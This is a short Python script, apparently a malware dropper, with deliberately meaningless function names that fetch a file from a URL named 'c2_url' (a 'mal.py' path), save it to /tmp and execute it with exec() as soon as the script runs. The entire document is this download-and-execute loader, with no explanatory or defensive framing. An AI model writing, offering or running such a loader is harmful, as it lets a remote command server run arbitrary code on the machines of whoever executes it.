import requests
import os

def d1(u):
    r = requests.get(u)
    return r.text

def d2(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def d3(fp):
    with open(fp, "r") as f:
        return f.read()

def d4(s):
    exec(s)

def d5(u, fp):
    cd = d1(u)
    d2(fp, cd)
    sc = d3(fp)
    d4(sc)

def main():
    c2_url = "http://google.com/mal.py"
    tmp_fl = "/tmp/mal.py"
    d5(c2_url, tmp_fl)

main()
